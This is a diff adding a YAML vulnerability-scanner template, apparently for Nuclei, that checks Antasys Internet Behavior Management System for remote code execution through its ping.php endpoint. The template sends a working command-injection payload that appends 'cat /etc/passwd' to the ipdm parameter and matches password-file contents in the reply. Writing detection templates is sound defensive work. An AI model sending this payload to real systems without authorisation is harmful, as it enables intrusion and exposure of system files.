@@ -1,0 +1,24 @@
+id: antasys-ibms-rce
+info:
+  name: Antasys IBMS Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+  description: |
+    This template checks for a Remote Code Execution (RCE) vulnerability in Antasys Internet Behavior Management System via the ping.php endpoint.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/dgn/dgn_tools/ping.php?ipdm=127.0.0.1;cat%20/etc/passwd;&ps=64&cnt=1"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "PING"
+          - "root:"
+          - "/bin"
+          - "<br>"
+        part: body
